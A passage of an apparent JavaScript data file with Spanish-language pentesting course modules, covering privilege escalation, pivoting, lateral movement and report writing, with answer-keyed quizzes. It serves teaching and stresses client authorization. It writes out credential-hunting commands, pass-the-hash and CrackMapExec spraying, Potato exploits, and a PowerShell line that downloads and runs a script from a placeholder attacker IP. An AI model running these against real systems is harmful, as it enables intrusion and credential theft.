            opts: ["Continúo de todas formas para demostrar el máximo impacto posible", "Acepto, documento el hallazgo con fecha y hora, y continúo con el resto del scope", "Pregunto al líder de proyecto si puedo ignorar la instrucción del cliente", "Escalo la vulnerabilidad brevemente antes de detenerme"],
            c: 1,
            e: "Las instrucciones del cliente durante el proyecto son vinculantes. El cliente conoce sus sistemas: puede saber que seguir podría derribar un servicio crítico o exponer datos que no deben verse. Documentas y continúas con otros objetivos."
          },
        ]
      },
    ]
  },

  {
    id: "rt-4",
    nombre: "Escalada de Privilegios",
    icon: "🚀",
    color: "#a855f7",
    tag: "FREE",
    descripcion: "Pasas de www-data a root en Linux, de usuario normal a SYSTEM en Windows. Con método, no con suerte.",
    lecciones: [
      {
        id: "rt-4-1",
        titulo: "Linux — De www-data a root",
        slides: [
          {
            tag: "CONTEXTO",
            titulo: "Antes de atacar, ubícate",
            contenido: `Estás dentro del servidor de Lumina Athletics como www-data. Es una cuenta muy limitada — la que usa el servidor web. No puedes leer archivos sensibles del sistema, no puedes cambiar configuraciones importantes.

Root es la cuenta que puede hacer absolutamente todo en Linux. Archivos, configuraciones, usuarios, servicios.

Pero antes de lanzarte a escalar, una pregunta honesta:

¿Ser root en este servidor cambia el impacto del hallazgo? ¿O el valor real está en otra cosa — credenciales en un archivo de configuración, acceso a una red interna, datos de clientes?

Si ya tienes www-data y puedes acceder a la base de datos de la tienda, eso puede valer más en el informe que ser root en ese servidor.

Si la escalada sí aporta valor, empieza así:
id → quién eres y qué grupos tienes
hostname → en qué equipo estás
uname -a → versión del kernel (versiones viejas tienen CVEs)

Estos tres comandos son siempre los primeros. Anotas todo con hora.`
          },
          {
            tag: "VECTORES",
            titulo: "Sudo, SUID y credenciales",
            contenido: `Los vectores más efectivos en escalada Linux, en orden de probabilidad:

1. SUDO — ¿qué puedes ejecutar con privilegios de otro usuario?
sudo -l
Si puedes ejecutar algún programa como root, GTFOBins (gtfobins.github.io) explica cómo cada programa puede explotarse para obtener shell o leer archivos.

2. SUID — programas que siempre se ejecutan como su dueño (root):
find / -perm -4000 -type f 2>/dev/null
Buscas programas raros, en rutas extrañas, que no deberían tener SUID.

3. CREDENCIALES EN ARCHIVOS:
cat /var/www/html/.env
cat ~/.bash_history
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"
Los desarrolladores dejan credenciales escritas. El historial de bash guarda comandos con contraseñas que alguien pegó.

4. CRON — tareas programadas como root:
cat /etc/crontab
Si una tarea corre como root y ejecuta un script que tú puedes modificar → puedes ejecutar código como root.

Herramienta automatizada: linpeas (github.com/peass-ng/PEASS-ng) — busca todo esto de una vez.`
          },
          {
            tag: "CREDENCIALES",
            titulo: "El hallazgo que vale más que root",
            contenido: `Mientras revisas el servidor de Drupal encuentras /var/www/html/.env:

DB_HOST=corp.local
DB_USER=drupal_app
DB_PASSWORD=S3cureDBp4ss!
DB_NAME=drupal_prod

Detente. Esto es más importante que cualquier escalada local.

DB_HOST=corp.local → ese nombre interno (.local) indica que hay una red interna del cliente que tú, desde afuera, no podías ver. Ese servidor está conectado a ella.

La contraseña que encontraste puede estar reutilizada en:
— El servidor de base de datos directamente
— Otros servicios de la red interna
— La cuenta de algún empleado
— El panel de administración de otro sistema

Este es el momento de parar y comunicar.

1. Anotas la credencial con fecha y hora
2. Avisas al cliente que encontraste acceso potencial a la red interna
3. Preguntas si puedes probarla contra otros sistemas del scope
4. Solo si tienes autorización explícita, continúas

Una credencial que abre la red interna es un hallazgo que cambia el informe entero.`
          },
        ],
        quiz: [
          {
            q: "sudo -l muestra que puedes ejecutar /usr/bin/vim como root. ¿Qué puedes hacer con esto?",
            opts: ["Editar archivos de sistema pero sin obtener una shell", "Según GTFOBins, vim puede lanzar una shell como root desde su modo de comando — es un vector de escalada clásico", "Solo ver archivos de configuración como root", "Nada, vim es solo un editor de texto"],
            c: 1,
            e: "GTFOBins documenta que vim con sudo puede ejecutar ':!/bin/bash' para obtener una shell root. Muchos programas aparentemente inocentes tienen capacidades no obvias cuando corren con privilegios elevados."
          },
          {
            q: "find / -perm -4000 -type f 2>/dev/null devuelve /usr/local/bin/backup_tool con SUID y propietario root. ¿Por qué es interesante?",
            opts: ["Los archivos SUID siempre son seguros si el propietario es root", "Es un programa no estándar en una ruta no estándar con SUID de root — merece investigación para ver si puede abusar de su ejecución privilegiada", "SUID solo afecta a binarios del sistema operativo", "Solo es relevante si el binario tiene vulnerabilidades conocidas en CVE"],
            c: 1,
            e: "Los programas SUID estándar del sistema son esperados. Uno personalizado en /usr/local/bin es sospechoso — puede tener un path traversal, inyección de comandos o simplemente lanzar una shell. GTFOBins primero, análisis manual después."
          },
          {
            q: "En .env encuentras DB_HOST=corp.local. ¿Por qué es más valioso que simplemente tener la contraseña de la base de datos?",
            opts: ["Porque corp.local siempre tiene vulnerabilidades críticas", "Porque revela que existe una red interna (.local) que el servidor puede alcanzar — potencial pivoting a sistemas no visibles desde internet", "Porque .local indica que el servidor está desactualizado", "Solo es relevante si tienes credenciales de admin del dominio"],
            c: 1,
            e: "corp.local es un nombre DNS interno, no resoluble desde internet. Su presencia confirma que el servidor comprometido está dentro de la red interna del cliente. Desde ese servidor puedes alcanzar sistemas que normalmente no son atacables externamente."
          },
          {
            q: "Linpeas marca decenas de vectores potenciales en colores. ¿Cuál es el enfoque correcto?",
            opts: ["Explotar todos los vectores rojos (críticos) antes de continuar", "Leer con criterio, priorizar los que tienen más probabilidad de funcionar y son menos invasivos, descartar lo que no confirmas rápido", "Explotar en el orden que linpeas los lista", "Ignorar linpeas y hacer la escalada manualmente siempre"],
            c: 1,
            e: "Linpeas es una herramienta, no un oráculo. Marca cosas que requieren interpretación. Algunos 'vectores' son configuraciones normales. Priorizar por impacto y probabilidad es parte del juicio profesional — no todo lo que linpeas marca es explotable."
          },
          {
            q: "Llevas 2 horas intentando escalar privilegios en el servidor sin resultado. ¿Cuál es la decisión correcta?",
            opts: ["Continuar hasta encontrar algo — la persistencia es la clave del pentesting", "Documentar los intentos, descartar este vector por ahora y pasar al siguiente objetivo del scope", "Pedir al cliente más tiempo exclusivamente para este servidor", "Intentar pruebas más agresivas aunque el cliente pidió que no fueran invasivas"],
            c: 1,
            e: "En consultoría el tiempo es real y los recursos son limitados. Si un vector no da señal después de un tiempo razonable, lo documentas y priorizas otros objetivos. Hay 5 objetivos más en el scope. El tiempo mal gastado aquí es tiempo que no inviertes en otros hallazgos."
          },
        ]
      },
      // Módulos adicionales para agregar al array REDTEAM_MODULOS en redteam.js

  {
    id: "rt-5",
    nombre: "Post-Explotación y Movimiento Lateral",
    icon: "🕵️",
    color: "#00d4ff",
    tag: "FREE",
    descripcion: "Dentro del sistema, mapeas la red interna, te mueves hacia otros objetivos y entiendes el alcance real del compromiso.",
    lecciones: [
      {
        id: "rt-5-1",
        titulo: "Reconocimiento interno",
        slides: [
          {
            tag: "POST-EXPLOTACION",
            titulo: "Primer contacto con la red interna",
            contenido: `Entraste como www-data en el servidor web de Lumina Athletics. Antes de moverte, entiendes exactamente dónde estás y qué hay alrededor.

Comandos de orientación inicial:

id
hostname
uname -a
ip addr
ip route
cat /etc/hosts
cat /etc/resolv.conf

ip addr te muestra todas las interfaces de red. Si hay más de una, el servidor está conectado a múltiples redes — lo que significa que puedes alcanzar segmentos que desde internet no son visibles.

ip route muestra la tabla de enrutamiento — a qué redes puede llegar este servidor.

/etc/hosts puede tener nombres internos de otros servidores que el administrador añadió manualmente. Cada entrada es un objetivo potencial.

/etc/resolv.conf revela el servidor DNS interno. Ese servidor DNS probablemente puede resolver nombres de máquinas internas que desde internet no existen.

Anota todo con fecha y hora. Estás mapeando territorio desconocido.`
          },
          {
            tag: "ENUMERACION INTERNA",
            titulo: "Descubrir hosts en la red interna",
            contenido: `El servidor comprometido tiene IP 10.0.0.15. Su tabla de rutas muestra la red 10.0.0.0/24.

Hay hasta 254 hosts posibles en esa red. ¿Cuáles están activos?

Ping sweep básico (bash):
for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo "10.0.0.$i activo"; done

Es lento pero funciona sin herramientas externas.

Con nmap (si está instalado o si puedes subirlo):
nmap -sn 10.0.0.0/24

-sn es ping scan — no escanea puertos, solo descubre hosts activos. Más rápido.

Resultados típicos en una red corporativa pequeña:
10.0.0.1  → router/gateway
10.0.0.5  → servidor de base de datos
10.0.0.10 → controlador de dominio Windows
10.0.0.15 → tú (servidor web comprometido)
10.0.0.20 → servidor de archivos

Cada host descubierto es un nuevo objetivo potencial. El controlador de dominio es el prize — quien lo controla controla toda la organización.

Anota cada host descubierto con su IP y cualquier nombre que puedas resolver.`
          },
          {
            tag: "SERVICIOS INTERNOS",
            titulo: "Qué corre en la red interna",
            contenido: `Con los hosts descubiertos, ahora miras qué servicios exponen internamente.

Desde el servidor comprometido:
nmap -sV 10.0.0.5
nmap -sV 10.0.0.10

Hallazgos típicos:

10.0.0.5 (DB server):
3306/tcp  open  mysql  MySQL 5.7.39
5432/tcp  open  postgresql

10.0.0.10 (Domain Controller):
53/tcp    open  domain  (DNS)
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds (SMB)
3389/tcp  open  ms-wbt-server (RDP)

El puerto 88 (Kerberos) confirma que 10.0.0.10 es el Domain Controller de Active Directory.

El puerto 3306 en el servidor de DB sin autenticación externa — ahora desde adentro puedes intentar conectarte directamente con las credenciales del .env que encontraste antes:

mysql -h 10.0.0.5 -u drupal_app -p

Si funciona, tienes acceso directo a la base de datos de producción.`
          },
          {
            tag: "CREDENCIALES",
            titulo: "Reutilización de credenciales",
            contenido: `Ya tienes la credencial del .env:
DB_USER=drupal_app
DB_PASSWORD=S3cureDBp4ss!

Antes de intentar explotar servicios, pruebas si esta contraseña se reutilizó en otros sistemas. La reutilización de contraseñas en entornos corporativos es extremadamente común.

Prueba SSH con las credenciales encontradas:
ssh drupal_app@10.0.0.5
ssh drupal_app@10.0.0.10

Prueba con variaciones comunes del usuario:
- El username del sistema puede ser diferente al de la DB
- Intenta: admin, administrator, root, waldo (nombre de empleado si lo encontraste en OSINT)

Si encuentras un archivo wp-config.php, settings.php u otro archivo de configuración:
find / -name "*.php" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null

Cada contraseña encontrada se prueba en todos los servicios descubiertos.

Una sola contraseña reutilizada puede darte acceso a múltiples sistemas. Esto se llama credential stuffing interno — y es devastadoramente efectivo en redes corporativas reales.`
          },
        ],
        quiz: [
          {
            q: "¿Por qué revisar /etc/hosts en el servidor comprometido?",
            opts: ["Para ver la contraseña del administrador del servidor", "Puede contener nombres y IPs de servidores internos que el administrador añadió manualmente — objetivos potenciales no visibles desde internet", "Para confirmar que el servidor tiene conexión a internet", "Para ver qué usuarios tienen acceso SSH al servidor"],
            c: 1,
            e: "/etc/hosts contiene mapeos manuales de hostname a IP. Los administradores frecuentemente añaden entradas para servidores internos como db.corp.local, dc01.corp.local, que no son accesibles desde internet pero sí desde la red interna."
          },
          {
            q: "El servidor comprometido tiene dos interfaces: eth0 (192.168.1.15, internet) y eth1 (10.0.0.15, red interna). ¿Qué significa esto?",
            opts: ["Solo que el servidor tiene redundancia de red", "El servidor es un pivot — conecta la red pública con la red interna. Desde él puedes alcanzar sistemas de la red 10.0.0.0/24 que normalmente no son accesibles desde internet", "Que el servidor tiene el doble de velocidad de red", "Solo importa si la red interna tiene más hosts que la externa"],
            c: 1,
            e: "Un servidor con dos interfaces en redes diferentes actúa como puente (pivot). Desde ese servidor comprometido puedes alcanzar toda la red interna 10.0.0.0/24 — incluido el Domain Controller, servidores de base de datos y cualquier otro sistema interno."
          },
          {
            q: "Encuentras el puerto 88 (Kerberos) abierto en 10.0.0.10. ¿Qué confirma esto?",
            opts: ["Que el servidor usa autenticación de dos factores", "Que 10.0.0.10 es el Domain Controller de Active Directory — el objetivo más valioso de la red interna", "Que el servidor tiene un firewall activo", "Que el servidor es un servidor de correo Microsoft Exchange"],
            c: 1,
            e: "El puerto 88 (Kerberos) junto con el 389 (LDAP) y 445 (SMB) son la firma de un Domain Controller de Active Directory. El DC es el objetivo más valioso en una red Windows — quien lo controla tiene acceso a todos los sistemas del dominio."
          },
          {
            q: "Tienes la credencial DB_PASSWORD=S3cureDBp4ss! del .env. ¿Por qué probarla en SSH y otros servicios además de la base de datos?",
            opts: ["Por protocolo — siempre se prueba en todos los servicios", "La reutilización de contraseñas en entornos corporativos es extremadamente común — la misma contraseña puede funcionar en múltiples sistemas y cuentas", "Porque MySQL y SSH usan las mismas credenciales por defecto", "Solo tiene sentido si el username también es el mismo"],
            c: 1,
            e: "Estudios muestran que más del 60% de las organizaciones tienen problemas de reutilización de contraseñas. Una contraseña encontrada en un sistema frecuentemente funciona en otros. Es uno de los vectores de movimiento lateral más efectivos y más comunes en pentesting real."
          },
          {
            q: "¿Cuál es la diferencia entre reconocimiento externo y reconocimiento interno?",
            opts: ["No hay diferencia práctica — las mismas herramientas y técnicas", "Externo: desde internet sin acceso al sistema. Interno: desde dentro de la red, con acceso a sistemas no visibles desde internet, más información de red y posibilidad de alcanzar infraestructura crítica", "Interno es siempre más sigiloso que externo", "Externo usa nmap, interno usa solo comandos nativos del sistema"],
            c: 1,
            e: "El reconocimiento interno es cualitativamente diferente: tienes acceso a la red interna completa, puedes ver servidores que no tienen exposición a internet, puedes escuchar tráfico de red local, y los firewalls internos suelen ser mucho más permisivos que los externos."
          },
        ]
      },
      {
        id: "rt-5-2",
        titulo: "Pivoting y Movimiento Lateral",
        slides: [
          {
            tag: "PIVOTING",
            titulo: "Usar el servidor comprometido como puente",
            contenido: `Pivoting es usar un sistema comprometido para llegar a otros sistemas que no son directamente accesibles.

Tu máquina atacante está en internet. Los servidores internos (10.0.0.x) no son accesibles desde internet. Pero el servidor web comprometido está en ambas redes.

TÉCNICA 1: Port Forwarding con SSH

Si tienes credenciales SSH en el servidor comprometido:
ssh -L 3306:10.0.0.5:3306 www-data@victima.com

Esto crea un túnel: tu localhost:3306 se reenvía a través del servidor comprometido hacia 10.0.0.5:3306

Ahora desde tu máquina:
mysql -h 127.0.0.1 -P 3306 -u drupal_app -p

Estás conectando a la base de datos interna como si estuvieras dentro de la red.

TÉCNICA 2: Dynamic Port Forwarding (SOCKS proxy)

ssh -D 9050 www-data@victima.com

Crea un proxy SOCKS en tu localhost:9050. Todo el tráfico que envíes por ese proxy sale desde el servidor comprometido.

Configurar proxychains para usar ese proxy:
proxychains nmap -sT 10.0.0.10

Ahora nmap escanea el Domain Controller desde dentro de la red interna, a través del servidor comprometido.`
          },
          {
            tag: "MOVIMIENTO LATERAL",
            titulo: "Pass the Hash y reutilización de credenciales",
            contenido: `Movimiento lateral es comprometer un sistema para llegar a otro dentro de la misma red.

REUTILIZACIÓN DE CREDENCIALES:
Ya probamos esto. Una credencial encontrada se prueba en todos los servicios.

PASS THE HASH (Windows):
En Windows, muchos protocolos de autenticación aceptan el hash NTLM directamente sin necesidad de conocer la contraseña en texto plano.

Si obtienes el hash NTLM de un usuario:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

Puedes autenticarte en otros sistemas Windows con ese hash, sin crackearlo:
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.0.0.20

Si el mismo usuario Administrator tiene la misma contraseña (mismo hash) en múltiples máquinas Windows — que es extremadamente común en entornos mal configurados — un solo hash te da acceso a toda la red.

HERRAMIENTAS DE MOVIMIENTO LATERAL:
impacket-psexec → ejecutar comandos remotos via SMB
impacket-wmiexec → ejecutar via WMI (más sigiloso)
crackmapexec → probar credenciales/hashes en múltiples hosts simultáneamente`
          },
          {
            tag: "HERRAMIENTA",
            titulo: "CrackMapExec — automatizar el movimiento lateral",
            contenido: `CrackMapExec (CME) automatiza la prueba de credenciales y hashes en múltiples sistemas Windows simultáneamente.

Probar una credencial en toda la red:
crackmapexec smb 10.0.0.0/24 -u Administrator -p 'S3cureDBp4ss!'

Probar un hash NTLM:
crackmapexec smb 10.0.0.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

Resultado verde con [+] = autenticación exitosa
Resultado con (Pwn3d!) = tienes acceso de administrador local

crackmapexec smb 10.0.0.0/24 -u Administrator -p 'Password123' --shares

--shares lista los recursos compartidos accesibles — archivos, backups, datos sensibles.

Ejecutar comandos en todos los sistemas donde autenticaste:
crackmapexec smb 10.0.0.0/24 -u Administrator -p 'Password123' -x "whoami"

Una sola credencial de administrador local + reutilización de contraseñas = acceso masivo a la red.

En el informe esto se documenta como: "Credencial encontrada en servidor web permitió autenticación en X sistemas adicionales — impacto: compromiso de la red interna completa."`
          },
        ],
        quiz: [
          {
            q: "¿Qué es pivoting en un contexto de pentesting?",
            opts: ["Cambiar de herramienta durante el escaneo", "Usar un sistema comprometido como puente para alcanzar otros sistemas en redes que no son directamente accesibles", "Rotar entre diferentes cuentas comprometidas", "Cambiar la IP de tu máquina atacante"],
            c: 1,
            e: "Pivoting permite alcanzar segmentos de red internos a través de sistemas ya comprometidos. El servidor web comprometido actúa como punto de entrada a la red interna que normalmente no es accesible desde internet."
          },
          {
            q: "ssh -D 9050 user@servidor crea un proxy SOCKS. ¿Para qué sirve combinado con proxychains?",
            opts: ["Para cifrar el tráfico entre tu máquina y el servidor", "Para enrutar el tráfico de herramientas como nmap a través del servidor comprometido, haciéndolo aparecer como si viniera de dentro de la red interna", "Para crear múltiples sesiones SSH simultáneas", "Para acelerar el escaneo de red"],
            c: 1,
            e: "El proxy SOCKS dinámico convierte el servidor comprometido en un router. proxychains redirige el tráfico de cualquier herramienta por ese proxy. El resultado: nmap o cualquier herramienta escanea la red interna como si estuviera físicamente dentro de ella."
          },
          {
            q: "¿Qué es Pass the Hash y por qué es efectivo en redes Windows?",
            opts: ["Pasar un diccionario de contraseñas entre herramientas", "Autenticarse en sistemas Windows usando el hash NTLM directamente sin conocer la contraseña en texto plano — funciona porque muchos protocolos Windows aceptan el hash como autenticación válida", "Un ataque que funciona solo contra contraseñas débiles", "Una técnica para descifrar hashes NTLM"],
            c: 1,
            e: "Windows NT LAN Manager acepta el hash como prueba de autenticación. Si obtienes el hash de Administrator de una máquina y ese hash es el mismo en otras (contraseña reutilizada), puedes autenticarte en todas sin conocer la contraseña original."
          },
          {
            q: "CrackMapExec devuelve '(Pwn3d!)' para varios hosts. ¿Qué significa?",
            opts: ["Que los hosts están caídos y no responden", "Que tienes acceso de administrador local en esos sistemas — puedes ejecutar comandos remotamente", "Que las credenciales son incorrectas", "Que los sistemas tienen el firewall activo"],
            c: 1,
            e: "(Pwn3d!) en CME indica que la credencial funciona Y tienes privilegios de administrador local, lo que permite ejecución remota de comandos via SMB. Es el resultado que buscas al hacer movimiento lateral."
          },
          {
            q: "¿Cómo documentas el movimiento lateral en el informe para el cliente?",
            opts: ["No se documenta para no alarmar al cliente", "Descripción técnica del vector (credencial reutilizada), sistemas afectados, comandos exactos ejecutados con timestamps, y el impacto real: cuántos sistemas fueron comprometidos a partir de un solo punto de entrada", "Solo se menciona como nota al pie del informe", "Se omite si el cliente no pidió explícitamente pruebas de movimiento lateral"],
            c: 1,
            e: "El movimiento lateral es uno de los hallazgos más importantes en un pentest — demuestra el impacto en cascada de una sola vulnerabilidad. El cliente necesita entender que comprometer un servidor web puede llevar al compromiso de toda su red interna."
          },
        ]
      },
    ]
  },

  {
    id: "rt-6",
    nombre: "Escalada de Privilegios en Windows",
    icon: "🪟",
    color: "#00d4ff",
    tag: "FREE",
    descripcion: "De usuario normal a SYSTEM en entornos Windows corporativos. Servicios, tokens, registros y técnicas reales.",
    lecciones: [
      {
        id: "rt-6-1",
        titulo: "Orientación en Windows",
        slides: [
          {
            tag: "WINDOWS",
            titulo: "Diferencias clave respecto a Linux",
            contenido: `Entrar a un sistema Windows corporativo se siente diferente a Linux. La estructura es distinta, las herramientas son distintas y los vectores de escalada son distintos.

Comandos de orientación inicial en Windows:

whoami
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
ipconfig /all
netstat -ano

whoami /priv muestra los privilegios del token actual. Algunos privilegios pueden explotarse directamente para escalar a SYSTEM sin necesidad de otros vectores.

Privilegios interesantes:
SeImpersonatePrivilege → explotable con Potato attacks (JuicyPotato, PrintSpoofer)
SeBackupPrivilege → puede leer cualquier archivo del sistema
SeDebugPrivilege → puede inyectar en cualquier proceso
SeRestorePrivilege → puede escribir en cualquier archivo

systeminfo muestra la versión exacta del sistema operativo y los hotfixes instalados. Con esa información buscas CVEs de escalada de privilegios locales.

net localgroup administrators lista quién tiene privilegios de administrador local — nombres de usuarios, grupos de dominio.`
          },
          {
            tag: "VECTORES",
            titulo: "Servicios mal configurados",
            contenido: `Los servicios de Windows son programas que corren en background con privilegios elevados. Un servicio mal configurado puede ejecutar código como SYSTEM.

PERMISOS DÉBILES EN BINARIOS DE SERVICIO:
Si puedes modificar el ejecutable que un servicio corre como SYSTEM, al reiniciar el servicio ejecutas tu código con esos privilegios.

Verificar permisos de servicios:
Get-WmiObject -Class Win32_Service | Select-Object Name, PathName, StartMode, State
icacls "C:\Program Files\VulnerableService\service.exe"

Si icacls muestra que tu usuario puede escribir el archivo → reemplazas el binario con uno malicioso y reinicias el servicio.

UNQUOTED SERVICE PATHS:
Cuando la ruta del ejecutable de un servicio tiene espacios y no está entre comillas, Windows prueba múltiples ubicaciones.

Ejemplo de ruta vulnerable:
C:\Program Files\My Service\bin\service.exe

Windows prueba en orden:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Service\bin\service.exe

Si puedes escribir en C:\Program Files\ → creas My.exe → se ejecuta como SYSTEM.

Buscar unquoted paths:
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

Cualquier resultado con espacios sin comillas es potencialmente explotable.`
          },
          {
            tag: "TOKENS",
            titulo: "Token Impersonation — Potato Attacks",
            contenido: `En Windows, cuando un servicio corre como SYSTEM y necesita autenticarse en la red, crea un token de autenticación. Si tienes SeImpersonatePrivilege, puedes robar ese token y usarlo para ejecutar código como SYSTEM.

SeImpersonatePrivilege es común en cuentas de servicio como:
IIS AppPool (servidor web IIS)
SQL Server service account
Network Service

PRINTSPOOFER — funciona en Windows 10/Server 2019+:
PrintSpoofer.exe -i -c cmd

Crea un proceso cmd.exe con privilegios de SYSTEM usando el Print Spooler.

JUICYPOTATO — funciona en Windows Server 2016/2019 y Windows 10 anteriores:
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

Ambas herramientas están en GitHub. En pentesting legítimo, las descargas en el servidor comprometido para ejecutarlas.

ROTTEN POTATO / SWEET POTATO — variantes para diferentes versiones de Windows.

La pregunta clave antes de usarlas: ¿whoami /priv muestra SeImpersonatePrivilege como Enabled? Si sí, estas herramientas funcionarán con alta probabilidad.`
          },
          {
            tag: "AUTOMATIZACION",
            titulo: "WinPEAS — automatizar la búsqueda",
            contenido: `WinPEAS (Windows Privilege Escalation Awesome Script) es el equivalente a LinPEAS pero para Windows. Busca automáticamente todos los vectores conocidos de escalada.

Descarga y ejecución:
IEX(New-Object Net.WebClient).downloadString('http://TU_IP/winPEAS.ps1')

O subir el ejecutable:
winPEASx64.exe

WinPEAS busca automáticamente:
— Privilegios de token explotables
— Servicios con permisos débiles
— Unquoted service paths
— Credenciales almacenadas en el registro
— Credenciales en archivos de configuración
— Tareas programadas modificables
— AlwaysInstallElevated (instalar MSI como SYSTEM)
— DLL hijacking oportunidades
— Software desactualizado con CVEs conocidos

El output está codificado por colores:
Rojo/Amarillo → hallazgo importante, investiga
Verde → configuración segura

Igual que LinPEAS: lee con criterio. No todo lo que marca es explotable en tu contexto específico.

Siempre anota: hora de ejecución, herramienta usada, versión, resultado completo.`
          },
        ],
        quiz: [
          {
            q: "whoami /priv muestra SeImpersonatePrivilege: Enabled. ¿Qué herramienta usas para escalar a SYSTEM en Windows Server 2019?",
            opts: ["JuicyPotato — funciona en todas las versiones de Windows", "PrintSpoofer — diseñado específicamente para Windows 10/Server 2019 y posterior", "Mimikatz — extrae credenciales de memoria", "WinPEAS — escanea vulnerabilidades automáticamente"],
            c: 1,
            e: "PrintSpoofer explota el Print Spooler para crear un proceso SYSTEM cuando tienes SeImpersonatePrivilege. JuicyPotato es para versiones anteriores. En Server 2019 y Windows 10 recientes, PrintSpoofer es la herramienta correcta."
          },
          {
            q: "Un servicio tiene la ruta: C:\\Program Files\\My App\\service.exe (sin comillas). ¿Por qué es vulnerable?",
            opts: ["Porque la ruta es demasiado larga para Windows", "Windows prueba múltiples ubicaciones para resolver la ruta — si puedes crear C:\\Program.exe o C:\\Program Files\\My.exe, se ejecuta como SYSTEM cuando el servicio inicia", "Solo es vulnerable si el servicio tiene permisos de red", "No es vulnerable, Windows maneja los espacios correctamente"],
            c: 1,
            e: "Sin comillas en rutas con espacios, Windows interpreta ambigüedad: prueba C:\\Program.exe primero. Si puedes escribir en C:\\ o C:\\Program Files\\, colocas un ejecutable malicioso que se ejecuta con los privilegios del servicio (frecuentemente SYSTEM)."
          },
          {
            q: "¿Por qué las cuentas de servicio de IIS frecuentemente tienen SeImpersonatePrivilege?",
            opts: ["Por un error de configuración — no deberían tenerlo nunca", "Porque IIS necesita impersonar usuarios para acceder a recursos en su nombre — es un comportamiento intencional, pero también un vector de escalada si el servidor web es comprometido", "Solo en versiones antiguas de IIS", "Para poder reiniciar el servidor web automáticamente"],
            c: 1,
            e: "IIS AppPool necesita SeImpersonatePrivilege para servir contenido en nombre de diferentes usuarios. Es funcionalidad legítima — pero significa que si comprometes el servidor web (como www-data en el contexto de IIS), heredas ese privilegio y puedes escalar a SYSTEM."
          },
          {
            q: "WinPEAS marca en rojo 'AlwaysInstallElevated: enabled'. ¿Qué significa?",
            opts: ["Que el sistema tiene las actualizaciones al día", "Que los instaladores MSI siempre se ejecutan con privilegios de SYSTEM, independientemente del usuario que los instale — cualquier MSI malicioso escala privilegios", "Que el usuario actual es administrador", "Que el firewall de Windows está habilitado"],
            c: 1,
            e: "AlwaysInstallElevated es una política que permite a usuarios sin privilegios instalar software con privilegios de SYSTEM. Si está habilitada en HKCU y HKLM, crear un MSI malicioso (msfvenom -f msi) y ejecutarlo te da SYSTEM automáticamente."
          },
          {
            q: "Encuentras credenciales en el registro de Windows: HKLM\\SOFTWARE\\config con 'password=Admin123'. ¿Qué haces primero?",
            opts: ["Las usas inmediatamente para escalar privilegios", "Las anotas con la ruta exacta del registro, la hora del hallazgo, y evalúas si están dentro del scope antes de probarlas en otros sistemas", "Las reportas al cliente sin investigar más", "Las ignoras porque probablemente son antiguas"],
            c: 1,
            e: "Documentar primero es siempre la respuesta correcta. La ruta del registro, el valor exacto, la hora. Luego evalúas: ¿en qué sistemas del scope tiene sentido probar esta credencial? ¿Está autorizado en el contrato? Actuar sin documentar primero es un error profesional."
          },
        ]
      },
    ]
  },

  {
    id: "rt-7",
    nombre: "El Informe Final",
    icon: "📋",
    color: "#ffd700",
    tag: "FREE",
    descripcion: "El cliente paga por el informe, no por los hallazgos. Aprende a comunicar vulnerabilidades con impacto real y recomendaciones accionables.",
    lecciones: [
      {
        id: "rt-7-1",
        titulo: "Estructura del informe profesional",
        slides: [
          {
            tag: "EL INFORME",
            titulo: "Por qué el informe es el producto real",
            contenido: `El cliente no vio nada de lo que hiciste durante dos semanas. Lo único que recibe y puede usar para mejorar su seguridad es el informe.

Un pentester que encuentra 10 vulnerabilidades pero las documenta mal entrega menos valor que uno que encuentra 5 y las explica perfectamente.

El informe tiene dos audiencias completamente distintas con necesidades distintas:

EJECUTIVOS (CEO, CISO, directores):
No son técnicos. No les importa qué exploit usaste. Les importa:
— ¿Cómo de expuesta está la empresa?
— ¿Qué puede pasar si un atacante real entra?
— ¿Cuánto cuesta arreglarlo vs cuánto cuesta no arreglarlo?
— ¿Qué priorizamos primero?

TÉCNICOS (sysadmins, desarrolladores, equipo de seguridad):
Necesitan detalles precisos para reproducir y arreglar:
— Pasos exactos de reproducción
— Herramientas y comandos usados
— Evidencia (screenshots, logs)
— Recomendación específica con recursos

El informe profesional tiene ambas secciones separadas claramente.`
          },
          {
            tag: "ESTRUCTURA",
            titulo: "Secciones del informe",
            contenido: `ESTRUCTURA ESTÁNDAR:

1. PORTADA
Nombre del cliente, fecha, clasificación (Confidencial), versión del documento.

2. RESUMEN EJECUTIVO (1-2 páginas)
Para no técnicos. Responde:
— Objetivo del proyecto
— Metodología usada (no técnica)
— Resumen de hallazgos por criticidad (gráfico)
— Riesgo general (Crítico / Alto / Medio / Bajo)
— Las 3 recomendaciones más urgentes

3. ALCANCE Y METODOLOGÍA
Qué sistemas se probaron, durante qué fechas y horarios, qué herramientas, qué tipo de pruebas (caja negra, blanca, gris).

4. HALLAZGOS (el cuerpo del informe)
Uno por uno, cada vulnerabilidad con:
— Título descriptivo
— Puntuación CVSS
— Descripción del problema
— Pasos de reproducción
— Evidencia (capturas de pantalla)
— Impacto real
— Recomendación específica

5. APÉNDICES
Herramientas usadas, código de exploits, logs completos.`
          },
          {
            tag: "CVSS",
            titulo: "Puntuación CVSS — cómo calcularla",
            contenido: `CVSS (Common Vulnerability Scoring System) es el estándar de la industria para puntuar la severidad de vulnerabilidades. Va de 0 a 10.

Escala:
0.0       → Ninguna
0.1 - 3.9  → Baja
4.0 - 6.9  → Media
7.0 - 8.9  → Alta
9.0 - 10.0 → Crítica

CVSS tiene tres grupos de métricas:

BASE (el más importante):
Attack Vector (AV): Network/Adjacent/Local/Physical
Attack Complexity (AC): Low/High
Privileges Required (PR): None/Low/High
User Interaction (UI): None/Required
Scope (S): Changed/Unchanged
Confidentiality (C): None/Low/High
Integrity (I): None/Low/High
Availability (A): None/Low/High

